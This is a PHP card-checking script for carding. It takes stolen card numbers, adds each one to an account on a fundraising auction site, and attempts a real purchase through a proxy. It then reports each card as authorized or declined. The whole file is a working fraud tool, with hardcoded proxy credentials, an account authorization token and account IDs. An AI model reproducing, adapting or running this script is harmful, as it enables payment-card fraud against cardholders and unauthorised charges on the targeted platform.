<?php

#==================[CODED BY XDEGO - WORLDPAY API]=================#
error_reporting(0);
set_time_limit(0);
date_default_timezone_set('America/Buenos_Aires');

// --- WEBSHARE CONFIGURATION ---
$webshare_proxy = "http://31.59.20.176:6754"; 
$webshare_auth  = "cfstgxzz:spt0ttz22rxi"; 

function multiexplode($delimiters, $string) {
    $one = str_replace($delimiters, $delimiters[0], $string);
    $two = explode($delimiters[0], $one);
    return $two;
}

function GetStr($string, $start, $end) {
    $str = explode($start, $string);
    if (!isset($str[1])) return "";
    $str = explode($end, $str[1]);
    return $str[0];
}

$lista = $_GET['lista'];
$data = multiexplode(array(":", "|"), $lista);
$cc = $data[0];
$mes = str_pad($data[1], 2, '0', STR_PAD_LEFT);
$ano = (strlen($data[2]) == 2) ? "20".$data[2] : $data[2];
$cvv = $data[3];

#==============[Request #1: Add Card]

$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://api.winwithdash.com/v4/users/69e052935f3a5600073865c4/add-card');
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_PROXY, $webshare_proxy);
curl_setopt($ch, CURLOPT_PROXYUSERPWD, $webshare_auth);
curl_setopt($ch, CURLOPT_POST, 1);

$headers1 = [
    'Host: api.winwithdash.com',
    'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:149.0) Gecko/20100101 Firefox/149.0',
    'Accept: application/json, text/plain, */*',
    'Accept-Language: fr,fr-FR;q=0.9,en-US;q=0.8,en;q=0.7',
    'Authorization: -ydSvuB1UnbRWJeIPFle63PvkjZb2ZkxAlNqnyHXjMoU1ptcrDYp5CKr2BXIhPgn',
    'Content-Type: application/json',
    'Origin: https://fans.winwithdash.com',
    'Referer: https://fans.winwithdash.com/',
    'Sec-Fetch-Dest: empty',
    'Sec-Fetch-Mode: cors',
    'Sec-Fetch-Site: same-site'
];
curl_setopt($ch, CURLOPT_HTTPHEADER, $headers1);

$post_data1 = json_encode([
    "currency" => "USD",
    "cvv" => $cvv,
    "number" => $cc,
    "zipCode" => "10004",
    "exp_month" => $mes,
    "exp_year" => $ano,
    "foundationId" => "668f12897f45720008a3e97e"
]);
curl_setopt($ch, CURLOPT_POSTFIELDS, $post_data1);
$result1 = curl_exec($ch);

$CID = GetStr($result1, ',"cardId":"', '",');

#==============[Request #2: Purchase Charge]

if (!empty($CID) && strpos($result1, '{"brand":"') !== false) {
    $ch2 = curl_init();
    // New Auction Item ID from your latest request
    curl_setopt($ch2, CURLOPT_URL, 'https://api.winwithdash.com/v4/auction-items/69dd4a720713a10007f15675/purchase');
    curl_setopt($ch2, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($ch2, CURLOPT_PROXY, $webshare_proxy);
    curl_setopt($ch2, CURLOPT_PROXYUSERPWD, $webshare_auth);
    curl_setopt($ch2, CURLOPT_POST, 1);
    curl_setopt($ch2, CURLOPT_HTTPHEADER, $headers1);

    $post_data2 = json_encode([
        "purchaseCount" => 1,
        "payWithCardId" => $CID,
        "payWithCustomerId" => "",
        "fulfillmentOption" => [
            "id" => "674279df1b610e0008be8e23",
            "createdAt" => "2024-11-24T00:57:03.617Z",
            "updatedAt" => "2026-03-17T18:23:26.685Z",
            "name" => "Bison Ticket Office",
            "type" => "pickup",
            "description" => "With this option, you can pick up your item anytime from 9 AM to 5 PM at our Ticketing Office, located at 318 W Washington Street, Suite 1A.",
            "sequence" => -1,
            "foundationId" => "668f12897f45720008a3e97e"
        ]
    ]);
    curl_setopt($ch2, CURLOPT_POSTFIELDS, $post_data2);
    $result2 = curl_exec($ch2);
    curl_close($ch2);
} else {
    $result2 = $result1;
}

#================[Response Handling]

if (strpos($result2, '"total"') !== false) {
    echo "<font size=4 color='green'>#Authorized ✅ $cc|$mes|$ano|$cvv </font><font size=2 color='green'>[WORLDPAY 15$]</font><br>";
} else {
    // Keycheck logic from your request
    if (strpos($result2, "refusé par la banque") !== false) {
        $msg = "Bank Refused";
    } elseif (strpos($result2, "données invalides") !== false) {
        $msg = "Invalid Data Params";
    } elseif (strpos($result2, "Internal Server Error") !== false) {
        $msg = "Hard Declined (DEAD)";
    } else {
        $msg = GetStr($result2, '"message":"', '"');
        if (empty($msg)) $msg = "Declined/Error";
    }
    echo "<font size=4 color='red'>#Declined! ❌ $cc|$mes|$ano|$cvv | Reason: $msg</font><br>";
}

curl_close($ch);
?>